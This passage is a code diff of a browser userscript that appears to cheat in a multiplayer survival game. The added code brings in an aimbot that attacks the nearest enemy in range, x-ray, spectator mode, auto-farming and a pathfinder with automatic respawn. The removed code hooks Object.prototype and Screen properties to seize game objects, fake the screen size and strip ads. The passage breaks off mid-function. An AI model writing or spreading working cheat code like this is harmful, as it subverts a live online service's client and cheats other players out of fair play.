@@ -425,7 +748,15 @@ setTimeout(() => {
             }
         },
         LoadHack: () => {
+            document.addEventListener("keypress", event => {
+                if (chatxterm()) return;
+                if (event.code === Settings.spectator.k && !Settings.spectator.e) {
+                    log(29);
+                    client[Object.keys(client)[0]].send([11, 0]);
+                };
+            });
             document.addEventListener("keydown", (e) => {
+
                 if (chatxterm()) return;
                 switch (e.code) {
                     case Settings.AutoSpike.k:
@@ -433,6 +764,13 @@ setTimeout(() => {
                         break;
                     case Settings.AutoSteal.k:
                         Settings.AutoSteal.e = true;
+                        break;
+                    case Settings.Xray.k:
+                        Settings.Xray.e = true;
+                        XrayOn();
+                        break;
+                    case Settings.dropSword.k:
+                        Settings.dropSword.e = true;
                         break;
                     case Settings.AutoExtractorPut.k:
                         Settings.AutoExtractorPut.e = !Settings.AutoExtractorPut.e
@@ -442,6 +780,7 @@ setTimeout(() => {
                         break;
                     case Settings.AMB.k:
                         Settings.AMB.e = !Settings.AMB.e
+                        Settings.AMB.off = false;
                         break;
                     case Settings.AutoBreadTake.k:
                         Settings.AutoBreadTake.e = !Settings.AutoBreadTake.e;
@@ -449,12 +788,49 @@ setTimeout(() => {
                     case Settings.AutoBreadPut.k:
                         Settings.AutoBreadPut.e = !Settings.AutoBreadPut.e
                         break;
+                    case Settings.spectator.k:
+                        Settings.spectator.x = 0
+                        Settings.spectator.y = 0
+                        Settings.spectator.e = !Settings.spectator.e
+                        break;
                     case Settings.AutoIce.k:
                         Settings.AutoIce.e = !Settings.AutoIce.e
+                        break;
+                    case Settings.Autofarm.k:
+                        Settings.Autofarm.e = !Settings.Autofarm.e
+                        break;
+                    case Settings.PathFinder.k:
+                        Settings.PathFinder.e = !Settings.PathFinder.e
+                        break;
+                    case Settings.TurnOffScript.k:
+                        Settings.TurnOffScript.e = !Settings.TurnOffScript.e
+                        if (Settings.TurnOffScript.e) turnOff();
+                        if (!Settings.TurnOffScript.e) turnOn();
                         break;
                     case "ShiftLeft":
                         console.log("ShiftLeft");
                         send([packets.equip, 7])
+                        Settings.AMB.off = true;
+                        break
+                    case "ArrowRight":
+                        id_tings += 1;
+                        console.log(id_tings);
+                        break
+                    case "ArrowLeft":
+                        id_tings -= 1;
+                        console.log(id_tings);
+                        break
+                    case "KeyW":
+                        Settings.spectator.is_y = 1;
+                        break
+                    case "KeyS":
+                        Settings.spectator.is_y = -1;
+                        break
+                    case "KeyA":
+                        Settings.spectator.is_x = 1;
+                        break
+                    case "KeyD":
+                        Settings.spectator.is_x = -1;
                         break
                 }
             });
@@ -468,12 +844,31 @@ setTimeout(() => {
                     case Settings.AutoSteal.k:
                         Settings.AutoSteal.e = false;
                         break;
+                    case Settings.Xray.k:
+                        Settings.Xray.e = false;
+                        XrayOff();
+                        break;
+                    case Settings.dropSword.k:
+                        Settings.dropSword.e = false;
+                        break;
                     case Settings.AutoCraft.k:
                         Settings.AutoCraft.e = !Settings.AutoCraft.e;
                         break;
                     case Settings.AutoRecycle.k:
                         Settings.AutoRecycle.e = !Settings.AutoRecycle.e;
                         break;
+                    case "KeyW":
+                        if (Settings.spectator.is_y > 0) Settings.spectator.is_y = 0
+                        break
+                    case "KeyS":
+                        if (Settings.spectator.is_y < 0) Settings.spectator.is_y = 0
+                        break
+                    case "KeyA":
+                        if (Settings.spectator.is_x > 0) Settings.spectator.is_x = 0
+                        break
+                    case "KeyD":
+                        if (Settings.spectator.is_x < 0) Settings.spectator.is_x = 0
+                        break
 
                 }
             });
@@ -484,140 +879,37 @@ setTimeout(() => {
                 skins.push("Skin: " + i);
             }
             kasdgiksadg.loadSettings();
+            Settings.Xray.e = false;
+            Settings.spectator.e = false;
+            Settings.TurnOffScript.e = false;
+            Settings.PathFinder.e = false; Settings.PathFinder.dist = 150;
+            Settings.Autofarm['x'] = 0; Settings.Autofarm['y'] = 0; Settings.Autofarm['xx'] = 0; Settings.Autofarm['yy'] = 0; Settings.Autofarm['sx'] = 0; Settings.Autofarm['sy'] = 0;
+
             kasdgiksadg.controls = new kasdgiksadg.controller();
             let e = unsafeWindow.document.createElement("script");
             e.onload = function () {
-                setTimeout(kasdgiksadg.KILLUKRSOLIDER, 500)
+                setTimeout(kasdgiksadg.KILLUKRSOLIDER, 900)
             }, e.src = "https://unpkg.com/guify@0.12.0/lib/guify.min.js", unsafeWindow.document.body.appendChild(e)
         },
     };
 
-    setTimeout(kasdgiksadg.LoadHack(), 3500)
-}, 500);
+    setTimeout(kasdgiksadg.LoadHack(), 4500)
+}, 1200);
 
 
 
-let LAST_CRAFT;
-
-let world;
-let game;
-let client;
-let user;
-let mouse
-let _this;
-let log = console.log
-let LAST_RECYCLE
-let master = Symbol()
-
-function hooks() {
-    Object.defineProperty(Object.prototype, "timeout", {
-        get() {
-            return this[master]
-        },
-        set(data) {
-            this[master] = data;
-            if (!client) {
-                client = this;
-                unsafeWindow.client = client;
-            }
-        },
-    })
-    Object.defineProperty(Object.prototype, "IDLE", {
-        get() {
-            return this[master]
-        },
-        set(data) {
-            this[master] = data;
-            if (!mouse) {
-                mouse = this;
-                unsafeWindow.mouse = mouse;
-            }
-        },
-    })
-    Object.defineProperty(Object.prototype, "opacity", {
-        get() {
-            this[master] = 0.5
-            return this[master]
-
-        },
-        set(data) {
-            this[master] = data;
-
-        },
-    })
-    Object.defineProperty(Object.prototype, "options", {
-        get() {
-            return this[master]
-        },
-        set(data) {
-            this[master] = data, !game && (this["sign"] && (game = this, log(game), unsafeWindow["game"] = game));
-        },
-    })
-    Object.defineProperty(Screen.prototype, "width", {
-        get: function () {
-            return 3840;
-        },
-        set: function (v) {
-            this[master] = v;
-        }
-    });
-    Object.defineProperty(Screen.prototype, "height", {
-        get: function () {
-            return 2160;
-        },
-        set: function (v) {
-            this[master] = v;
-        }
-    });
-    Object.defineProperty(Object.prototype, "mode", {
-        get() {
-            return this[master]
-        },
-        set(data) {
-            this[master] = data;
-            if (!world) {
-                world = this;
-                unsafeWindow.world = world;
-            }
-        },
-    })
-
-    Object.defineProperty(Object.prototype, "control", {
-        get() {
-            return this[master]
-        },
-        set(data) {
-            this[master] = data;
-            if (!user) {
-                user = this;
-                user[Object.keys(user)[10]] = false // alive
-                unsafeWindow.user = user;
-                ads();
-                disableVideo();
-            }
-        },
-    })
-}
-
-
-hooks()
 //////////////////////////////////////////////////////////////////////////////
 
+
 function send(data) {
-    let sock;
-    let counter = 0;
-
-    for (let prop1 in client) {
-        counter++;
-
-        if (counter === 1) {
-            sock = prop1;
-            break;
-        }
+    try {
+        client[Object.keys(client)[0]].send(JSON.stringify(data));
+    } catch (error) {
+        Settings.textalert.t = 'Error loading script'
+        Settings.textalert.e = true
+        return
     }
 
-
-    client[sock].send(JSON.stringify(data))
 }
 function unit() {
     let units;
@@ -665,6 +957,7 @@ function myplayer() {
 
 }
 
+/*
 function pid(obj) {
     let wow
     if (unit()[0].length > 0) {
@@ -680,6 +973,7 @@ function pid(obj) {
 
     return obj.ΔⵠⵠⲆ;
 }
+*/
 
 function chatxterm() {
     if (document.getElementById("chat_block").style.display === 'inline-block' || document.getElementById("commandMainBox").style.display === 'inline-block') {
@@ -741,6 +1035,30 @@ function gauges2() {
     return gauge2;
 }
 
+function Getinventory() {
+
+    let inv;
+    let inv2;
+    let counter = 0;
+
+    for (let prop1 in user) {
+        counter++;
+
+        if (counter === 35) {
+            inv = user[prop1];
+            let counter2 = 0;
+            for (let prop2 in inv) {
+                counter2++;
+                if (counter2 === 4) {
+                    inv2 = inv[prop2];
+                }
+            }
+            break;
+        }
+    }
+    return inv2;
+}
+
 function inventoryHas(id) {
 
     let inv;
@@ -764,12 +1082,19 @@ function inventoryHas(id) {
     }
 
 
-
     if (inv2[id] !== 0 && inv2[id] !== undefined) {
         return [true, inv2[id]]
     } else {
         return [false, undefined]
     }
+}
+
+
+function resetColors() {
+    Settings.MainColor = 'rgb(16, 212, 68)',
+        Settings.TextColor = "rgb(21, 201, 68)",
+        Settings.BackgroundColor = "rgb(22, 22, 22)",
+        kasdgiksadg.saveSettings();
 }
 
 function DropInChest() {
@@ -829,6 +1154,27 @@ function getUserPosition() {
     return [camx, camy]
 }
 
+
+function turnOff() {
+    Settings.ColoredSpikes = false;
+    Settings.spectator.e = false;
+
+    const elements = document.querySelectorAll('[class*="guify-"]');
+    elements.forEach(element => {
+        element.style.display = 'none';
+    });
+
+}
+
+function turnOn() {
+    Settings.ColoredSpikes = true;
+
+    const elements = document.querySelectorAll('[class*="guify-"]');
+    elements.forEach(element => {
+        element.style.display = '';
+    });
+}
+
 function drawsp() {
     let drawSpike = null;
 
@@ -852,28 +1198,35 @@ function drawsp() {
 }
 
 unsafeWindow.sp = drawsp
-function ads() {
-    let uwu = document.getElementById("preroll")
-    let uws = document.getElementById("trevda")
-    let style = document.createElement('style');
 
-    uwu.remove()
-    uws.remove()
-    style.innerHTML = '.grecaptcha-badge { visibility: hidden; }';
 
-    document.head.appendChild(style);
+function autoresp() {
+    let _0x36da2b = Object.keys(client)[137];
+    let _0x172688 = Object.keys(client)[136];
+    let _0x34844e = Object.keys(_this)[85];
+    let _0x130c89 = client[_0x36da2b];
+    client[_0x36da2b] = function () {
+        if (Settings.autoRespawn) {
+            cooldowns.PathFinder = Date['now']();
+            client[_0x172688]();
+            setTimeout(spawn, 1500);
+            return _0x130c89.apply(this, arguments);
+        }
+        return Settings.PathFinder.e && Settings.PathFinder.autoRestart && (cooldowns.PathFinder = Date['now'](), client[_0x172688](), _this[_0x34844e]()), _0x130c89.apply(this, arguments);
+    };
 }
 
-/*
-function ads() {
-    const _0x3de620 = _0x3f77d1;
-    document[_0x3de620(0x148)](_0x3de620(0xc3));
-    let _0x25b473 = document[_0x3de620(0x148)]('preroll'),
-        _0x5462ee = document[_0x3de620(0x148)](_0x3de620(0x179)),
-        _0x4197bb = document[_0x3de620(0x152)](_0x3de620(0x8c));
-    _0x25b473[_0x3de620(0x15a)](), _0x5462ee[_0x3de620(0x15a)](), _0x4197bb[_0x3de620(0x9c)] = _0x3de620(0xb0), document['head'][_0x3de620(0xcc)](_0x4197bb), console['log'](_0x25b473 + ':' + _0x5462ee), console['log'](_0x3de620(0x142));
+
+function backToLobby() {
+    let _0x172688 = Object.keys(client)[136];
+    client[_0x172688]()
 }
-    */
+
+
+function spawn() {
+    let _0x34844e = Object.keys(_this)[85];
+    _this[_0x34844e]()
+}
 
 
 function autoBook() {
@@ -910,64 +1263,280 @@ function getdist(a, b) {
 function getImgForChest(chest) {
     let copy_game = game
     if (!copy_game) return;
-    return copy_game["ᐃⲆᐃ"][chest.action / 2 - 1]["info"]["ⵠΔ"][0];
+    let o = copy_game[Object.keys(copy_game)[44]][chest.action / 2 - 1]["info"]
+    return o[Object.keys(o)[2]][0];
+}
+
+
+let cooldowns = {
+    Autofarm: Date['now'](),
+    PathFinder: Date['now']()
+};
+
+
+function autofarm() {
+    requestAnimationFrame(autofarm);
+
+    function _0x2c4b97(_0x2965fb, _0x5723f3, _0x30ace0) {
+        return _0x2965fb && _0x5723f3 ? _0x30ace0 ? Math['atan2'](_0x5723f3['r']['y'] - _0x2965fb['r']['y'], _0x5723f3['r']['x'] - _0x2965fb['r']['x']) : Math['atan2'](_0x5723f3['y'] - _0x2965fb['y'], _0x5723f3['x'] - _0x2965fb['x']) : null;
+    }
+    let _0x456623 = Object.keys(client)[0x7a], player = myplayer();
+    if (Settings.Autofarm.e) {
+        if (Date['now']() - cooldowns.Autofarm > 0x32) {
+            let _0x2a1577 = {
+                'obj': null,
+                'dist': -0x1,
+                'type': 0x0
+            };
+            var _0x4770ff = {
+                'x': Settings.Autofarm['x'],
+                'y': Settings.Autofarm['y'],
+                'width': Settings.Autofarm['xx'] - Settings.Autofarm['x'],
+                'height': Settings.Autofarm['yy'] - Settings.Autofarm['y']
+            };
+            plants = [...unit()[0x3], ...unit()[0x1f], ...unit()[0x25], ...unit()[0x27], ...unit()[0x28], ...unit()[0x2b], ...unit()[0x2c], ...unit()[0x36], ...unit()[0x37]]
+            for (var i = 0x0, _0x59cf69 = plants['length'], plant = null, _0x340be5 = null; i < _0x59cf69; ++i) {
+                plant = plants[i];
+                if (!plant['info'] || plant['info'] === 0xa) continue;
+                if (!Settings.Autofarm['water'] && plant['info'] === 0x10) continue;
+                if (_0x4770ff['x'] < plant['x'] - 0x32 + 0x64 && _0x4770ff['x'] + _0x4770ff['width'] > plant['x'] - 0x32 && _0x4770ff['y'] < plant['y'] - 0x32 + 0x64 && _0x4770ff['y'] + _0x4770ff['height'] > plant['y'] - 0x32) {
+                    let _0x4d83c2 = Object.keys(mouse)[0x4];
+                    Settings.Autofarm.e && Settings.Autofarm['angle'] != null && (mouse[_0x4d83c2]['x'] = getUserPosition()[0x0] + plant['x'], mouse[_0x4d83c2]['y'] = getUserPosition()[0x1] + plant['y']);
+                    _0x340be5 = (player['x'] - plant['x']) ** 0x2 + (player['y'] - plant['y']) ** 0x2;
+                    (_0x2a1577['dist'] === -0x1 || _0x340be5 < _0x2a1577['dist']) && (_0x2a1577['dist'] = _0x340be5, _0x2a1577['obj'] = plant);;
+                };
+            };
+
+            function _0x1d908b(_0xff379f, _0x13231b) {
+                if (_0xff379f && _0x13231b) return Math['sqrt']((_0xff379f['x'] - _0x13231b['x']) ** 0x2 + (_0xff379f['y'] - _0x13231b['y']) ** 0x2);;
+                return null;
+            };
+            if (_0x2a1577['obj']) {
+                _0x2a1577['dist'] = _0x1d908b(player, _0x2a1577['obj']);
+                switch (_0x2a1577['obj']['info']) {
+                    case 0x1:
+                    case 0x2:
+                    case 0x3:
+                        if (inventoryHas(0x36)[0x0]) {
+                            player['right'] !== 0x36 && send([packets['equip'], 0x36]);;
+                        } else {
+                            if (inventoryHas(0x35)[0x0]) {
+                                player['right'] !== 0x35 && send([packets['equip'], 0x35]);;
+                            }
+                        };
+                        _0x2a1577['type'] = 0x2;
+                        break;
+                    case 0x10:
+                    case 0x11:
+                    case 0x12:
+                    case 0x13:
+                        if (Settings.Autofarm['water']) {
+                            if (inventoryHas(0x31)[0x0]) {
+                                if (player['right'] !== 0x31) send([packets['equip'], 0x31]);
+                                _0x2a1577['type'] = 0x1;
+                            };
+                        } else {
+                            if (inventoryHas(0x36)[0x0]) {
+                                player['right'] !== 0x36 && send([packets['equip'], 0x36]);;
+                            } else {
+                                if (inventoryHas(0x35)[0x0]) {
+                                    player['right'] !== 0x35 && send([packets['equip'], 0x35]);;
+                                }
+                            };
+                            _0x2a1577['type'] = 0x2;
+                        };
+                        break;
+                };
+                let _0x4eca81 = {
+                    'x': player['x'] - _0x2a1577['obj']['x'],
+                    'y': player['y'] - _0x2a1577['obj']['y']
+                },
+                    _0x57c2ec = {
+                        'x': Math['abs'](player['x'] - _0x2a1577['obj']['x']),
+                        'y': Math['abs'](player['y'] - _0x2a1577['obj']['y'])
+                    },
+                    _0x1d01db = 0x0;
+                if (_0x57c2ec['x'] > 0x3c) {
+                    if (_0x4eca81['x'] > 0x32) _0x1d01db += 0x1;
+                    if (_0x4eca81['x'] < 0x32) _0x1d01db += 0x2;
+                };
+                if (_0x57c2ec['y'] > 0x3c) {
+                    if (_0x4eca81['y'] > 0x32) _0x1d01db += 0x8;
+                    if (_0x4eca81['y'] < 0x32) _0x1d01db += 0x4;
+                };
+                client[_0x456623](_0x1d01db);
+                if (_0x57c2ec['x'] < (_0x2a1577['type'] === 0x1 ? 0x78 : 0x12c) && _0x57c2ec['y'] < (_0x2a1577['type'] === 0x1 ? 0x78 : 0x12c)) {
+                    Settings.Autofarm['angle'] = _0x2c4b97(player, _0x2a1577['obj'], !![]);
+                    let _0x2ad285 = 0x2 * Math['PI'],
+                        _0x42fb54 = Math['floor']((Settings.Autofarm['angle'] + _0x2ad285) % _0x2ad285 * 0xff / _0x2ad285);
+                    Settings.Autofarm['angle'] && (send([packets['attack'], _0x42fb54]), send([packets['stopAttack']]));;
+                };
+            } else {
+                let _0x897afa = {
+                    'x': player['x'] - Settings.Autofarm['sx'],
+                    'y': player['y'] - Settings.Autofarm['sy']
+                },
+                    _0x52a51a = {
+                        'x': Math['abs'](player['x'] - Settings.Autofarm['sx']),
+                        'y': Math['abs'](player['y'] - Settings.Autofarm['sy'])
+                    },
+                    _0x265b45 = 0x0;
+                if (_0x52a51a['x'] > 0x3c) {
+                    if (_0x897afa['x'] > 0x0) _0x265b45 += 0x1;
+                    if (_0x897afa['x'] < 0x0) _0x265b45 += 0x2;
+                };
+                if (_0x52a51a['y'] > 0x3c) {
+                    if (_0x897afa['y'] > 0x0) _0x265b45 += 0x8;
+                    if (_0x897afa['y'] < 0x0) _0x265b45 += 0x4;
+                };
+                client[_0x456623](_0x265b45);
+            }
+            cooldowns.Autofarm = Date['now']();
+        }
+    }
+}
+
+function PathFinder() {
+    if (!Settings.PathFinder.e) return;
+    if (!script.user.alive) {
+        if (Date['now']() - cooldowns.PathFinder > 3000) {
+            user[Object.keys(user)[14]] = Gen(7);
+            user[Object.keys(user)[15]] = Gen(5);
+            spawn();
+            cooldowns.PathFinder = Date['now']();
+        }
+        return;
+    }
+    let player = myplayer()
+
+
+    function dropInv() {
+        inv = Getinventory()
+        itemIds = Object.keys(inv);
+        rightItemsId = []
+        counter = 0;
+        for (let i = 0; i < itemIds.length; i++) {
+            const id = itemIds[i];
+            if (inv[id]) rightItemsId.push(id);
+            counter += inv[id];
+        }
+        if (counter == 0) return false;
+
+        for (let i = rightItemsId.length - 1; i >= 0; i--) {
+            const id = parseInt(rightItemsId[i], 10)
+            let chests = script.world.units[11];
+            let currentchest = null;
+            let dist = 100000;
+            for (let i = 0; i < chests.length; i++) {
+                let chest = chests[i];
+                if (chest.info && chest.action / 2 - 1 != id) continue;
+                d = (player.x - chest.x) ** 2 + (player.y - chest.y) ** 2;
+                if (d < dist) {
+                    dist = d;
+                    currentchest = chest;
+                    currentchest.dist = d;
+                }
+            }
+            if (!currentchest) { return true }
+            const pid = currentchest[Object.keys(currentchest)[1]]
+            send([packets.chestPut, id, 100, pid, currentchest.id]);
+        }
+        return true
+    }
+
+    let movment = Object.keys(client)[0x7a];
+    let dist = Math.sqrt((player['x'] - (Settings.PathFinder.x * 100 + 50)) ** 0x2 + (player['y'] - (Settings.PathFinder.y * 100 + 50)) ** 2);
+    if (Settings.PathFinder.autoRestart && dist > Settings.PathFinder.dist * 100) {
+        cooldowns.PathFinder = Date['now']();
+        backToLobby();
+    };
+    if (Settings.PathFinder.autoDrop && dist < 300) {
+        if (!dropInv()) {
+            counter2 = 0;
+            cooldowns.PathFinder = Date['now']();
+            backToLobby();
+        }
+    };
+    if (inventoryHas(223)[0]) {
+        if (player[Object.keys(player)[61]] !== 223) send([packets['equip'], 223]);
+    };
+
+    let normDelta = {
+        'x': player['x'] - (Settings.PathFinder.x * 100 + 50),
+        'y': player['y'] - (Settings.PathFinder.y * 100 + 50)
+    },
+        absDelta = {
+            'x': Math['abs'](player['x'] - (Settings.PathFinder.x * 100 + 50)),
+            'y': Math['abs'](player['y'] - (Settings.PathFinder.y * 100 + 50))
+        },
+        res = 0x0;
+    if (absDelta['x'] > 60) {
+        if (normDelta['x'] > 0) res += 0x1;
+        if (normDelta['x'] < 0) res += 0x2;
+    };
+    if (absDelta['y'] > 60) {
+        if (normDelta['y'] > 0) res += 0x8;
+        if (normDelta['y'] < 0) res += 0x4;
+    };
+    client[movment](res);
+}
+
+function HoldWeapon(_, $) {
+    switch (_) {
+        case 34:
+        case 18:
+        case 33:
+        case 15:
+        case 14:
+        case 13:
+        case 12:
+        case 16:
+        case 17:
+            return 2;
+        case 57:
+        case 5:
+        case 6:
+        case 30:
+        case 62:
+        case 9:
+        case 0:
+        case 63:
+        case 19:
+            return 1;
+        case 64:
+        case 65:
+        case 66:
+        case 67:
+        case 68:
+        case 70:
+        case 69:
+            return 3;
+        case 94:
+        case 95:
+        case 96:
+        case 97:
+        case 98:
+        case 90:
+        case 99:
+            return 6;
+        case 45:
+            if ($) return 4;
+        case -1:
+            if ($) return 5;
+    }
+    return 0;
 }
 
 
 function aimbot() {
     requestAnimationFrame(aimbot);
-
+    if (!Settings.AMB.off) Settings.textalert.e = false;
+    if (Settings.TurnOffScript.e) return;
 
     let myPlayer = myplayer();
     const maxDist = 450000;
     const outDist = 120000;
     const normDist = 50000;
-
-    function HoldWeapon(_, $) {
-        switch (_) {
-            case 34:
-            case 18:
-            case 33:
-            case 15:
-            case 14:
-            case 13:
-            case 12:
-            case 16:
-            case 17:
-                return 2;
-            case 57:
-            case 5:
-            case 6:
-            case 30:
-            case 62:
-            case 9:
-            case 0:
-            case 63:
-            case 19:
-                return 1;
-            case 64:
-            case 65:
-            case 66:
-            case 67:
-            case 68:
-            case 70:
-            case 69:
-                return 3;
-            case 94:
-            case 95:
-            case 96:
-            case 97:
-            case 98:
-            case 90:
-            case 99:
-                return 6;
-            case 45:
-                if ($) return 4;
-            case -1:
-                if ($) return 5;
-        }
-        return 0;
-    }
 
     function calcAngle(_, $, o) {
         return _ && $ ? (o ? Math.atan2($.r.y - _.r.y, $.r.x - _.r.x) : Math.atan2($.y - _.y, $.x - _.x)) : null;
@@ -977,8 +1546,8 @@ function aimbot() {
         let nearest = NearestEnemy(myPlayer, PlayerList);
 
         if (Settings.AMB_rotation && Settings.AMB.e && Settings.AMB.a != null) {
-            mouse.ⵠΔΔⲆ.x = getUserPosition()[0] + nearest.x;
-            mouse.ⵠΔΔⲆ.y = getUserPosition()[1] + nearest.y;
+            mouse[Object.keys(mouse)[4]].x = getUserPosition()[0] + nearest.x;
+            mouse[Object.keys(mouse)[4]].y = getUserPosition()[1] + nearest.y;
         }
 
         return nearest;
@@ -988,12 +1557,13 @@ function aimbot() {
         let nearest = null;
         let distSqrd = maxDist;
         const myPid = myPlayer[Object.keys(myPlayer)[1]]
+        log(PlayerList);
 
         for (var i = 0, obj = null, d = null; i < PlayerList.length; ++i) {
             obj = PlayerList[i];
             const pid = obj[Object.keys(obj)[1]]
             if (pid === myPid || isAlly(pid)) continue; // Skip self and allies
-            if (!isAlly(pid) && myPlayer.fly === obj.fly && !obj.ghost) {
+            if (!isAlly(pid) && myPlayer[fly] === obj[fly] && !obj.ghost) {
                 d = (myPlayer.x - obj.x) ** 2 + (myPlayer.y - obj.y) ** 2;
                 if (d < distSqrd) {
                     distSqrd = d;
@@ -1014,7 +1584,7 @@ function aimbot() {
                 if (pid != enemyForAMB.pid) continue;
 
 
-                if (!isAlly(pid) && myPlayer.fly === obj.fly && !obj.ghost) {
+                if (!isAlly(pid) && myPlayer[fly] === obj[fly] && !obj.ghost) {
                     d = (myPlayer.x - obj.x) ** 2 + (myPlayer.y - obj.y) ** 2;
                     if (d < normDist) {
                         enemyForAMB.d = d;
@@ -1052,19 +1622,19 @@ function aimbot() {
         let myRange;
         switch (weaponType) {
             case 1:
-                myRange = myPlayer.fly ? 196.8 : 157.6;
+                myRange = myPlayer[fly] ? 196.8 : 157.6;
                 break;
             case 2:
-                myRange = myPlayer.fly ? 291.8 : 227.6;
+                myRange = myPlayer[fly] ? 291.8 : 227.6;
                 break;
             case 3:
                 myRange = 620;
                 break;
             case 4:
-                myRange = myPlayer.fly ? 140 : 125;
+                myRange = myPlayer[fly] ? 140 : 125;
                 break;
             case 5:
-                myRange = myPlayer.clothe == 85 || myPlayer.clothe == 83 ? (myPlayer.fly ? 120.8 : 97.6) : null;
+                myRange = myPlayer.clothe == 85 || myPlayer.clothe == 83 ? (myPlayer[fly] ? 120.8 : 97.6) : null;
                 break;
             default:
                 myRange = null;
@@ -1085,7 +1655,6 @@ function aimbot() {
 
             if (Enemy) {
                 const RangeBetweenMeAndEnemy = dist2dSQRT(myPlayer, Enemy);
-                console.log(RangeBetweenMeAndEnemy);
                 if (RangeBetweenMeAndEnemy <= myRange) {
                     Settings.AMB.a = calcAngle(myPlayer, Enemy, true);
                     Settings.AMB.t = Enemy;
@@ -1114,19 +1683,19 @@ function aimbot() {
         let myRange;
         switch (weaponType) {
             case 1:
-                myRange = myPlayer.fly ? 196.8 : 157.6;
+                myRange = myPlayer[fly] ? 196.8 : 157.6;
                 break;
             case 2:
-                myRange = myPlayer.fly ? 291.8 : 227.6;
+                myRange = myPlayer[fly] ? 291.8 : 227.6;
                 break;
             case 3:
                 myRange = 620;
                 break;
             case 4:
-                myRange = myPlayer.fly ? 140 : 125;
+                myRange = myPlayer[fly] ? 140 : 125;
                 break;
             case 5:
-                myRange = myPlayer.clothe == 85 || myPlayer.clothe == 83 ? (myPlayer.fly ? 120.8 : 97.6) : null;
+                myRange = myPlayer[Object.keys(myPlayer)[63]] == 85 || myPlayer.clothe == 83 ? (myPlayer[fly] ? 120.8 : 97.6) : null;
                 break;
             default:
                 myRange = null;
@@ -1144,38 +1713,39 @@ function aimbot() {
             ctx.lineTo(script.user.cam.x + Enemy.x, script.user.cam.y + Enemy.y);
             if (enemyForAMB.d < normDist) ctx.strokeStyle = "#e100ff";
             else ctx.strokeStyle = "#ff006a";
+            if (enemyForAMB.d > normDist) Settings.AMB.off = false;
             ctx.stroke();
             ctx.restore();
 
             if (enemyForAMB.d < normDist) {
                 if (Settings.AMB_rotation) {
-                    mouse.ⵠΔΔⲆ.x = getUserPosition()[0] + Enemy.x;
-                    mouse.ⵠΔΔⲆ.y = getUserPosition()[1] + Enemy.y;
+                    mouse[Object.keys(mouse)[4]].x = getUserPosition()[0] + Enemy.x;
+                    mouse[Object.keys(mouse)[4]].y = getUserPosition()[1] + Enemy.y;
                 }
                 ctx.save();
                 ctx.font = "15px Baloo Paaji";
                 ctx.fillStyle = "red";
-                ctx.fillText(`⬤`, mouse.ⵠΔΔⲆ.x, mouse.ⵠΔΔⲆ.y);
+                ctx.fillText(`⬤`, mouse[Object.keys(mouse)[4]].x, mouse[Object.keys(mouse)[4]].y);
                 ctx.restore();
             }
         }
 
+        if (Settings.AMB.off) {
+            Settings.textalert.t = "AMB OFF"
+            Settings.textalert.e = true
+        }
 
         if (myRange) {
             if (Enemy) {
 
                 const RangeBetweenMeAndEnemy = dist2dSQRT(myPlayer, Enemy);
-                console.log(RangeBetweenMeAndEnemy);
                 if (RangeBetweenMeAndEnemy <= myRange) {
                     Settings.AMB.a = calcAngle(myPlayer, Enemy, true);
                     Settings.AMB.t = Enemy;
                     const e = 2 * Math.PI;
                     const Angle255 = Math.floor((((Settings.AMB.a + e) % e) * 255) / e);
-                    if (Settings.AMB_rotation) {
-                        // send([packets.angle, Angle255]);
-                    }
 
-                    if (Settings.AMB.a && RangeBetweenMeAndEnemy <= myRange - 27) {
+                    if (!Settings.AMB.off && Settings.AMB.a && RangeBetweenMeAndEnemy <= myRange - 22) {
                         send([packets.attack, Angle255]);
                         send([packets.stopAttack]);
                     }
@@ -1185,6 +1755,321 @@ function aimbot() {
                 }
             } else {
                 Settings.AMB.a = null;
+            }
+        }
+    }
+
+}
+
+
+function calculateHp(units) {
+
+    function getWeaponDist(myPlayer) {
+        let weaponType = 0
+        switch (myPlayer.right) {
+            case 34:
+            case 18:
+            case 33:
+            case 15:
+            case 14:
+            case 13:
+            case 12:
+            case 16:
+            case 17:
+                weaponType = 2;
+                break
+            case 57:
+            case 5:
+            case 6:
+            case 30:
+            case 62:
+            case 9:
+            case 0:
+            case 63:
+            case 19:
+                weaponType = 1;
+                break
+            case 64:
+            case 65:
+            case 66:
+            case 67:
+            case 68:
+            case 70:
+            case 69:
+                weaponType = 3;
+                break
+            case 8:
+            case 1:
+            case 3:
+            case 4:
+            case 31:
+            case 32:
+            case 46:
+            case 50:
+            case 51:
+            case 52:
+            case 49:
+            case 55:
+            case 56:
+            case 28:
+            case 35:
+            case 36:
+            case 37:
+            case 38:
+            case 39:
+            case 45:
+                weaponType = 4;
+                break
+            case 71:
+            case 72:
+            case 73:
+            case 74:
+            case 75:
+            case 76:
+            case -1:
+                weaponType = 5;
+                break
+        }
+        let myRange;
+        switch (weaponType) {
+            case 1:
+                myRange = myPlayer[fly] ? 196.8 : 157.6;
+                break;
+            case 2:
+                myRange = myPlayer[fly] ? 291.8 : 227.6;
+                break;
+            case 3:
+                myRange = 620;
+                break;
+            case 4:
+                myRange = myPlayer[fly] ? 140 : 125;
+                break;
+            case 5:
+                myRange = myPlayer[fly] ? 120.8 : 97.6;
+                break;
+            default:
+                myRange = 0;
+                break;
+        }
+        return myRange;
+    }
+
+    function calcAngle(_, $, o) {
+        return _ && $ ? (o ? Math.atan2($.r.y - _.r.y, $.r.x - _.r.x) : Math.atan2($.y - _.y, $.x - _.x)) : null;
+    }
+
+    function NearestEntity(myPlayer, AllEntity) {
+        let weaponDist = getWeaponDist(myPlayer)
+        let nearest = [];
+        let myPid = myPlayer[Object.keys(myPlayer)[1]]
+
+        for (var i = 0, obj = null, d = null; i < AllEntity.length; ++i) {
+            obj = AllEntity[i];
+            if (obj.type == 0 && myPid == obj[Object.keys(obj)[1]]) continue;
+            if (!myPlayer.ghost) {
+                d = (myPlayer.x - obj.x) ** 2 + (myPlayer.y - obj.y) ** 2;
+                d = Math.sqrt(d)
+                if (d < weaponDist) {
+                    angle = calcAngle(myPlayer, obj)
+                    if (Math.abs(angle - myPlayer.angle) < 1.5) {
+                        nearest.push(obj);
+                    }
+                }
+            }
+        }
+        return nearest;
+    }
+
+    function NearestPlayer(ent, PlayerList) {
+        let nearest = null;
+        let dist = 900;
+
+        for (var i = 0, obj = null, d = null; i < PlayerList.length; ++i) {
+            obj = PlayerList[i];
+            if (!obj.ghost) {
+                d = Math.sqrt((ent.x - obj.x) ** 2 + (ent.y - obj.y) ** 2)
+                if (d < dist) {
+                    dist = d;
+                    nearest = obj;
+                }
+            }
+        }
+        return nearest;
+    }
+
+    function NearestEnemy(player) {
